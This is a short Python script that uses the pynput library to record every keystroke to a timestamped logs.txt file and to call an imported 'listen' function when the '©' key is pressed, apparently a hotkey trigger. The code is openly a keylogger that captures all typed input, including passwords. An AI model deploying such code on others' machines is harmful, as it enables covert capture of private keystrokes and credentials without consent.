#!/usr/bin/env python

from pynput.keyboard import Listener
from commands import listen

import os
import logging
import string

def key_handler(key):
    logging.info(key)
    parse(key)

def parse(key):
    print(key.__dict__)
    if not hasattr(key, 'char'):
        return
    if key.char != "©":
        return
    listen()

def keylog():
    username = os.getlogin()
    logging_directory = "."
    logging.basicConfig(filename=f"{logging_directory}/logs.txt",
                        level=logging.DEBUG, format="%(asctime)s: %(message)s")

    with Listener(on_press=key_handler) as listener:
        listener.join()

if __name__=="__main__":
    keylog()
